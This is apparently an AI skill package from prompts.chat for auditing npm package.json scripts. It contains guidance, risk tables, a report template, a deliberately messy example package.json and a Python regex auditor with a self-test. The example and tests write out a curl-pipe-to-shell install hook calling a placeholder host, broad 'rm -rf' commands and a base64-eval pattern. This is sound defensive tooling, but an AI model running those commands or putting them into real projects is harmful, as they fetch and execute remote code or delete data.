# package.json Scripts Auditor

By @f · general
Language: en · Domains: education · Source: P01

Source page: https://prompts.chat

```
---
name: package-json-scripts-auditor
description: Audits the scripts section of an npm package.json for safety and clarity: risky install hooks, curl-pipe-to-shell, rm -rf, sudo, inline secrets, unpinned npx, non-portable shell syntax, placeholder test scripts, missing standard scripts, and confusing names. Use when reviewing a repo, a dependency, or a PR that changes package.json scripts. Includes a stdlib Python auditor with severity levels.
---

# package.json Scripts Auditor

You review the `scripts` block of a Node.js `package.json` and explain what each script does, which ones are risky, and how to make the set clearer and more portable. You cover two audiences: maintainers tidying their own project, and reviewers checking whether a dependency or PR runs anything dangerous at install time. You never run the scripts yourself; you read them.

## Files in this skill

- `scripts/audit_scripts.py` - reads a package.json and reports findings with severity (high, medium, low, info) and a suggested fix (Python 3 standard library only)
- `references/script-conventions.md` - standard script names, lifecycle hooks, naming, and portability conventions
- `references/dangerous-patterns.md` - patterns that deserve a closer look, why they matter, and safer alternatives
- `templates/audit-report.md` - the report shape to return
- `examples/package.json` - a deliberately messy example to practice on

## Workflow

### 1. Collect context
Ask for the full `package.json` (not only `scripts`, since `name`, `private`, `bin`, `workspaces`, and `packageManager` matter), and whether this is the user's own project or a third-party package. Ask which OS the team uses (Windows support changes portability advice).

### 2. Run the auditor
'''
python3 scripts/audit_scripts.py path/to/package.json
python3 scripts/audit_scripts.py --json path/to/package.json
python3 scripts/audit_scripts.py --self-test
'''
Exit code 0 = no high findings, 1 = at least one high finding, 2 = file error.

### 3. Review manually
The script is pattern-based. Also read each script yourself and check:
- Lifecycle hooks (`preinstall`, `install`, `postinstall`, `prepare`) run automatically for consumers; any network call or file write outside the project there is a red flag.
- Scripts that call other files (`node scripts/setup.js`, `sh ./build.sh`): ask to see those files before calling the package safe.
- Obfuscation (base64, hex strings, `eval`, `node -e` with long one-liners) deserves high suspicion.

### 4. Recommend
Use `references/script-conventions.md` and `references/dangerous-patterns.md` to propose concrete replacements: `rimraf` or `del-cli` instead of `rm -rf`, `cross-env` instead of `VAR=value cmd`, pinned `npx pkg@1.2.3`, `prepublishOnly` running tests, and grouped names like `lint:js`, `test:unit`.

### 5. Report
Fill `templates/audit-report.md`: verdict, findings table, a rewritten `scripts` block, and follow-up questions.

## Rules

- Rate severity by impact: anything that can run remote code or delete files outside the project on install is high.
- Do not accuse authors of malice; describe the behavior and the risk.
- Keep the user's existing script names when renaming would break CI, and say which CI files would need updating if you do suggest a rename.
- Suggest `npm install --ignore-scripts` for auditing untrusted packages, and `npm config set ignore-scripts true` only with the trade-offs explained.
FILE:references/dangerous-patterns.md
# Dangerous and Risky Script Patterns

| Pattern | Example | Why it matters | Safer alternative | Severity |
|---|---|---|---|---|
| Remote script piped to a shell | `curl -fsSL https://x.sh \| sh` | Runs whatever the server returns, unpinned and unverified | Vendor the script, pin by checksum, or use a published package | high |
| Network fetch in install hooks | `"postinstall": "node download.js"` / `wget` | Runs on every consumer's machine at install time | Ship artifacts in the package, or make the step opt-in | high |
| Recursive delete of broad paths | `rm -rf /`, `rm -rf ~`, `rm -rf $DIR/` with unset var | Can wipe data outside the project | `rimraf dist`, explicit relative paths | high |
| `sudo` | `sudo npm i -g x` | Escalates privileges from a script | Never require root in scripts; document manual steps | high |
| `eval` / encoded payloads | `eval "$(echo ... \| base64 -d)"`, `node -e "...Buffer.from('..','base64')"` | Hides what runs | Plain, readable commands in files | high |
| Inline secrets | `API_TOKEN=abc123 node deploy.js` | Leaks in git history and CI logs | Environment variables from a secret store or `.env` not committed | high |
| World-writable permissions | `chmod 777`, `chmod -R a+w` | Lets any user modify files | Minimal permissions (`chmod +x file`) | medium |
| Skipping safety checks | `git commit --no-verify`, `npm publish --force`, `--unsafe-perm` | Bypasses hooks and protections | Fix the failing check instead | medium |
| Unpinned `npx` / `dlx` | `npx create-thing` | Downloads and runs the latest version at run time | `npx create-thing@3.2.1` or add as devDependency | medium |
| Global installs in scripts | `npm i -g typescript` | Changes the user's machine; versions drift | devDependency + local bin | medium |
| Plain HTTP URLs | `curl http://...` | Can be tampered with in transit | HTTPS | medium |
| `git push` / `npm publish` in hooks | `"postbuild": "npm publish"` | Accidental releases | Explicit `release` script run by CI | medium |
| Non-portable shell syntax | `NODE_ENV=prod`, `export`, `cp -r` | Breaks on Windows | `cross-env`, `cpy-cli`, Node scripts | low |
| Placeholder test | `echo "Error: no test specified" && exit 1` | CI fails or tests silently missing | Real test runner | low |
| Very long one-liners | > 200 chars | Hard to review; hides risk | Move to a script file | low |

## Review tips
- For third-party packages: inspect with `npm pack <pkg>` and read the tarball, or install with `--ignore-scripts` first.
- Follow file references: `node scripts/postinstall.js` is only as safe as that file.
- Watch for `prepare` in git dependencies: it runs when installing from a git URL.
FILE:references/script-conventions.md
# npm Script Conventions

## Standard names
| Script | Purpose | Run with |
|---|---|---|
| `start` | Run the app in production mode | `npm start` |
| `dev` | Run with watch / hot reload | `npm run dev` |
| `build` | Produce build output | `npm run build` |
| `test` | Run the test suite (CI default) | `npm test` |
| `lint` | Static checks | `npm run lint` |
| `format` | Apply formatter | `npm run format` |
| `typecheck` | `tsc --noEmit` or similar | `npm run typecheck` |
| `clean` | Remove build artifacts | `npm run clean` |

Use a colon to group variants: `test:unit`, `test:e2e`, `lint:css`, `build:docs`. Use `npm-run-all` / `run-p` / `run-s`, or `npm run a && npm run b`, to compose them.

## Lifecycle hooks
| Hook | Runs when | Notes |
|---|---|---|
| `preinstall`, `install`, `postinstall` | Your package is installed, including as a dependency | Runs on every consumer's machine. Keep empty unless compiling native code. |
| `prepare` | After local `npm install` and before `npm publish`/`npm pack`; also for git dependencies | Good for building or setting up git hooks (e.g. `husky`). |
| `prepublishOnly` | Only before `npm publish` | Put `npm test && npm run build` here. |
| `prepack`, `postpack` | Around `npm pack` / publish | |
| `preX` / `postX` | Automatically before/after any script `X` | Can surprise readers; prefer explicit chaining. pnpm does not run them by default. |

## Portability
- Windows `cmd.exe` does not understand `VAR=value cmd`, `export`, `rm -rf`, `cp -r`, `&` backgrounding, single quotes, or `$VAR`. Use `cross-env`, `rimraf`, `cpy-cli`, `concurrently`, and Node scripts.
- `&&` works in both shells; `;` does not run the same way in `cmd.exe`.
- Prefer local binaries (from `devDependencies`) over globally installed ones; npm adds `node_modules/.bin` to PATH inside scripts.

## Clarity
- One job per script; move long logic (> ~120 characters) into `scripts/*.js` or `*.mjs` files.
- Avoid names that shadow npm commands or each other (`install`, `publish`, `test2`).
- Replace the default `echo "Error: no test specified" && exit 1` with a real test command or remove it.
- Document unusual scripts in the README.
- Set `"private": true` for apps that must never be published.
FILE:templates/audit-report.md
# package.json Scripts Audit

**Package:** `<name>@<version>`  |  **Owner:** own project / third-party  |  **Private:** yes/no
**Verdict:** Safe / Needs changes / Do not install until reviewed
**Counts:** high `<n>`, medium `<n>`, low `<n>`, info `<n>`

## Script inventory
| Script | What it does (plain words) | Runs automatically? |
|---|---|---|
| `build` | | no |
| `postinstall` | | yes, on every install |

## Findings
| # | Severity | Script | Pattern | Why it matters | Fix |
|---|---|---|---|---|---|
| 1 | high | | | | |

## Suggested scripts block
'''json
{
  "scripts": {
  }
}
'''

## Also check
- Files referenced by scripts: `<list>`
- CI files that call renamed scripts: `<list>`
- devDependencies to add: `<rimraf, cross-env, ...>`

## Questions for the maintainer
1.
FILE:examples/package.json
{
  "name": "acme-dashboard",
  "version": "0.4.2",
  "description": "Internal dashboard (example with deliberately messy scripts for auditing practice)",
  "main": "dist/index.js",
  "scripts": {
    "preinstall": "curl -fsSL http://get.example.com/setup.sh | sh",
    "postinstall": "node scripts/fetch-assets.js",
    "start": "NODE_ENV=production node dist/index.js",
    "dev": "nodemon src/index.ts",
    "build": "rm -rf dist && tsc -p .",
    "test": "echo \"Error: no test specified\" && exit 1",
    "deploy": "API_TOKEN=sk_live_example123 node scripts/deploy.js",
    "fix-perms": "chmod -R 777 ./uploads",
    "commit": "git add -A && git commit --no-verify -m wip",
    "gen": "npx create-acme-widget",
    "postbuild": "npm publish",
    "setup": "sudo npm install -g typescript"
  },
  "devDependencies": {
    "nodemon": "^3.1.0",
    "typescript": "^5.6.0"
  }
}
FILE:scripts/audit_scripts.py
#!/usr/bin/env python3
"""Audit the "scripts" section of an npm package.json.

Usage:
    python3 audit_scripts.py path/to/package.json [--json]
    python3 audit_scripts.py --self-test

Exit codes: 0 = no high findings, 1 = high findings present, 2 = file error.
Pattern-based: always read the scripts and any files they call yourself.
Python 3 standard library only.
"""
import argparse
import json
import re
import sys

INSTALL_HOOKS = {"preinstall", "install", "postinstall", "prepare"}
SEVERITY_ORDER = {"high": 0, "medium": 1, "low": 2, "info": 3}

# (id, regex, severity, message, fix)
PATTERNS = [
    ("pipe-to-shell", r"\b(curl|wget)\b[^|]*\|\s*(sudo\s+)?(ba|z|da)?sh\b", "high",
     "Downloads a remote script and pipes it into a shell.",
     "Vendor the script, verify a checksum, or use a pinned package."),
    ("broad-rm", r"\brm\s+-[a-z]*r[a-z]*f?[a-z]*\s+(/|~|\$HOME|\$\{?\w+\}?/?)(\s|$|&|;)", "high",
     "Recursive delete of a root, home, or variable-based path.",
     "Delete an explicit relative path, e.g. `rimraf dist`."),
    ("sudo", r"(^|[\s;&|])sudo\s", "high",
     "Uses sudo inside an npm script.",
     "Never require root from scripts; document any manual setup."),
    ("eval-or-encoded", r"\beval\b|base64\s+(-d|--decode)|Buffer\.from\([^)]*base64", "high",
     "Uses eval or decodes an encoded payload, hiding what runs.",
     "Replace with plain, readable commands in a script file."),
    ("inline-secret", r"\b[A-Z0-9_]*(TOKEN|SECRET|PASSWORD|PASSWD|API_KEY|APIKEY|PRIVATE_KEY)[A-Z0-9_]*=(?!\$)\S+", "high",
     "Hard-coded secret value in a script.",
     "Read secrets from the environment or a secret manager; rotate the exposed value."),
    ("chmod-777", r"\bchmod\s+(-R\s+)?(0?777|a\+w|o\+w)\b", "medium",
     "Makes files world-writable.",
     "Use minimal permissions, e.g. `chmod +x bin/cli.js`."),
    ("skip-checks", r"--no-verify|--force\b|--unsafe-perm|--ignore-engines", "medium",
     "Bypasses safety checks or hooks.",
     "Fix the underlying failure instead of skipping the check."),
    ("unpinned-npx", r"\b(npx|pnpm\s+dlx|bunx|yarn\s+dlx)\s+(-y\s+|--yes\s+)?(?!-)(@?[\w./-]+)(?=\s|$)(?<!@latest)", "medium",
     "Runs a package via npx/dlx without a pinned version.",
     "Pin it (`npx pkg@1.2.3`) or add it to devDependencies."),
    ("global-install", r"\bnpm\s+(i|install)\s+(-g|--global)\b|\byarn\s+global\s+add\b", "medium",
     "Installs packages globally from a script.",
     "Add as a devDependency and use the local binary."),
    ("plain-http", r"http://(?!localhost|127\.0\.0\.1)", "medium",
     "Fetches over plain HTTP.",
     "Use HTTPS."),
    ("publish-or-push", r"\bnpm\s+publish\b|\bgit\s+push\b", "medium",
     "Publishes or pushes from a script.",
     "Keep releases in an explicit `release` script or CI job."),
    ("non-portable-env", r"(^|&&\s*|;\s*)[A-Z_][A-Z0-9_]*=\S+\s+\S", "low",
     "Inline env assignment `VAR=value cmd` does not work in Windows cmd.",
     "Use `cross-env VAR=value cmd`."),
    ("non-portable-cmd", r"(^|[\s;&|])(rm\s+-|cp\s+-r|export\s+\w+=|mv\s)", "low",
     "Unix-only shell command.",
     "Use rimraf / cpy-cli / a Node script for Windows support."),
]

PLACEHOLDER_TEST = re.compile(r'no test specified', re.I)
NETWORK = re.compile(r"\b(curl|wget|git\s+clone|Invoke-WebRequest)\b|https?://", re.I)
FILE_REF = re.compile(r"\b(?:node|sh|bash|python3?)\s+(\.?/?[\w./-]+\.(?:m?js|cjs|ts|sh|py))")


def audit(pkg):
    findings = []

    def add(sev, script, rule, msg, fix):
        findings.append({"severity": sev, "script": script, "rule": rule, "message": msg, "fix": fix})

    scripts = pkg.get("scripts")
    if not isinstance(scripts, dict) or not scripts:
        add("info", None, "no-scripts", "No scripts section found.", "Add standard scripts such as build, test, lint.")
        return findings

    for name, cmd in scripts.items():
        if not isinstance(cmd, str):
            add("medium", name, "not-string", "Script value is not a string.", "Make it a shell command string.")
            continue
        for rule, rx, sev, msg, fix in PATTERNS:
            if re.search(rx, cmd):
                add(sev, name, rule, msg, fix)
        if name in INSTALL_HOOKS:
            if name == "prepare":
                add("info", name, "install-hook", "`prepare` runs on local install and for git dependencies.",
                    "Keep it limited to build or git-hook setup.")
            else:
                add("medium", name, "install-hook", f"`{name}` runs automatically on every consumer's install.",
                    "Remove it unless it compiles native code; move setup to an explicit script.")
            if NETWORK.search(cmd):
                add("high", name, "network-in-install-hook", "Install hook performs network access.",
                    "Ship assets in the package or make the download opt-in.")
            for ref in FILE_REF.findall(cmd):
                add("high" if name != "prepare" else "medium", name, "install-hook-runs-file",
                    f"Install hook executes `{ref}`; its contents decide the real risk.",
                    f"Read `{ref}` before trusting this package.")
        if name == "test" and PLACEHOLDER_TEST.search(cmd):
            add("low", name, "placeholder-test", "Default placeholder test script.", "Wire up a real test runner.")
        if len(cmd) > 200:
            add("low", name, "long-script", f"Script is {len(cmd)} characters long.", "Move the logic into a script file.")
        if name.startswith(("pre", "post")) and name not in INSTALL_HOOKS and name not in ("prepublishOnly", "prepack", "postpack"):
            base = name[3:] if name.startswith("pre") else name[4:]
            if base in scripts:
                add("info", name, "implicit-hook", f"Runs automatically around `{base}` (pnpm skips these by default).",
                    f"Consider chaining explicitly inside `{base}`.")
        if not re.match(r"^[a-z0-9][a-z0-9:._-]*$", name):
            add("low", name, "naming", "Script name uses unusual characters or uppercase.",
                "Use lowercase names grouped with colons, e.g. `test:unit`.")

    for std in ("build", "test", "lint"):
        if std not in scripts and not any(k.startswith(std + ":") for k in scripts):
            add("info", None, "missing-standard", f"No `{std}` script.", f"Add a `{std}` script if the project needs one.")
    if not pkg.get("private") and "prepublishOnly" not in scripts and "publish-or-push" not in [f["rule"] for f in findings]:
        add("info", None, "no-prepublishonly", "Package is publishable but has no `prepublishOnly` check.",
            "Add `\"prepublishOnly\": \"npm test && npm run build\"` or set `\"private\": true`.")
    findings.sort(key=lambda f: (SEVERITY_ORDER[f["severity"]], f["script"] or ""))
    return findings


def self_test():
    pkg = {
        "name": "t", "scripts": {
            "preinstall": "curl -fsSL http://x.example/s.sh | sh",
            "postinstall": "node scripts/setup.js",
            "clean": "rm -rf $OUT/",
            "deploy": "API_TOKEN=abc123 node deploy.js",
            "perm": "chmod -R 777 uploads",
            "gen": "npx create-foo",
            "gen2": "npx create-foo@1.2.3",
            "start": "NODE_ENV=production node index.js",
            "test": "echo \"Error: no test specified\" && exit 1",
            "setup": "sudo npm i -g typescript",
            "build": "tsc",
        }}
    f = audit(pkg)
    rules = {(x["script"], x["rule"]) for x in f}
    checks = [
        (("preinstall", "pipe-to-shell"), True),
        (("preinstall", "network-in-install-hook"), True),
        (("preinstall", "plain-http"), True),
        (("postinstall", "install-hook-runs-file"), True),
        (("clean", "broad-rm"), True),
        (("deploy", "inline-secret"), True),
        (("perm", "chmod-777"), True),
        (("gen", "unpinned-npx"), True),
        (("gen2", "unpinned-npx"), False),
        (("start", "non-portable-env"), True),
        (("test", "placeholder-test"), True),
        (("setup", "sudo"), True),
        (("setup", "global-install"), True),
        (("build", "broad-rm"), False),
    ]
    failed = 0
    for key, expected in checks:
        ok = (key in rules) == expected
        failed += not ok
        print(f"{'PASS' if ok else 'FAIL'}  {key[0]}:{key[1]} expected={'present' if expected else 'absent'}")
    clean = audit({"name": "c", "private": True, "scripts": {"build": "tsc -p .", "test": "vitest run", "lint": "eslint ."}})
    ok = not [x for x in clean if x["severity"] in ("high", "medium", "low")]
    failed += not ok
    print(f"{'PASS' if ok else 'FAIL'}  clean package has no high/medium/low findings")
    total = len(checks) + 1
    print(f"\n{total - failed}/{total} passed")
    return 1 if failed else 0


def main(argv=None):
    p = argparse.ArgumentParser(description="Audit npm package.json scripts.")
    p.add_argument("file", nargs="?", help="Path to package.json")
    p.add_argument("--json", action="store_true", help="Output JSON")
    p.add_argument("--self-test", action="store_true", help="Run built-in tests")
    a = p.parse_args(argv)
    if a.self_test:
        return self_test()
    if not a.file:
        p.error("file is required (or use --self-test)")
    try:
        with open(a.file, encoding="utf-8") as fh:
            pkg = json.load(fh)
    except (OSError, json.JSONDecodeError) as exc:
        print(f"Cannot read {a.file}: {exc}", file=sys.stderr)
        return 2
    findings = audit(pkg)
    counts = {s: sum(1 for f in findings if f["severity"] == s) for s in SEVERITY_ORDER}
    if a.json:
        print(json.dumps({"package": pkg.get("name"), "counts": counts, "findings": findings}, indent=2))
    else:
        print(f"Package: {pkg.get('name', '?')}@{pkg.get('version', '?')}")
        for f in findings:
            where = f["script"] or "-"
            print(f"[{f['severity'].upper():6}] {where:12} {f['rule']}: {f['message']}\n{'':22}fix: {f['fix']}")
        print("\n" + ", ".join(f"{k} {v}" for k, v in counts.items()))
    return 1 if counts["high"] else 0


if __name__ == "__main__":
    sys.exit(main())
```

Prompt from the public prompts.chat library (CC0), credited to its contributor.
